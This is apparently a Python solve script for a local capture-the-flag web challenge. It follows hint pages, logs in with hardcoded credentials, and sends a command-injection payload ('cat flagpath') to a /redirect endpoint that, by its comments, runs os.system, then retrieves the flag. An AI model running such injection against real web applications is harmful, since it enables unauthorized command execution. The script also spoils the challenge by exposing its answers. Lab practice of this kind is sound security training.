import requests
import base64

BASE_URL = "http://127.0.0.1:5004"

print("1. Visiting /...")
r1 = requests.get(f"{BASE_URL}/")
print("Fake flags present?", "DAKSHH{f4ke" in r1.text)

print("\n2. Following hints to /gmdost...")
r2 = requests.get(f"{BASE_URL}/gmdost")
print("Status 429 hint present?", "429" in r2.text or "Error Code" in r2.text)

print("\n3. Following hint to /429...")
r3 = requests.get(f"{BASE_URL}/429")
print("/yagf hint present?", "yagf" in r3.text)

print("\n4. Following hint to /yagf...")
session = requests.Session()
r4 = session.get(f"{BASE_URL}/yagf")
print("Base64 string present?", "aHR0cDovL3RyYW5zZmVyLnNoLzFsZ0dibGMvbG9naW4udHh0" in r4.text)

print("\n5. Logging in at /validate...")
r5 = session.post(f"{BASE_URL}/validate", data={"usr": "vn_daan_vararu", "pwd": "flag_find_panna_poraru"})
print("Did it redirect to finalpath?", "last page" in r5.text or "redirect" in r5.url or "finalpath" in r5.url)

print("\n6. Getting flag path...")
# We need to simulate the command injection. The code uses `os.system` and saves to `res.txt`.
# In a local test, it might fail to find `flagpath` if it doesn't exist.
# Let's create `flagpath` file locally first so `cat flagpath` works.
import os
with open("flagpath.txt", "w") as f:
    f.write("/dshgfayiurhaejkhbdsajvn\n")
# However the code expects `cat flagpath` specifically. Let's make sure it exists without extension.
with open("flagpath", "w") as f:
    f.write("/dshgfayiurhaejkhbdsajvn\n")

# Now run command injection
r6 = session.post(f"{BASE_URL}/redirect", data={"cmd": "cat flagpath"})
flag_path = r6.text.replace("<h3>", "").replace("</h3>", "").strip()
print("Command injection result:", flag_path)

print("\n7. Visiting final route...")
r7 = session.get(f"{BASE_URL}{flag_path}/testuser")
if "DAKSHH{" in r7.text:
    print("SUCCESS! Found final flag!")
    for line in r7.text.splitlines():
        if "DAKSHH" in line:
            print(line.strip())
else:
    print("FAILED! Final flag not found.")
    print(r7.text)
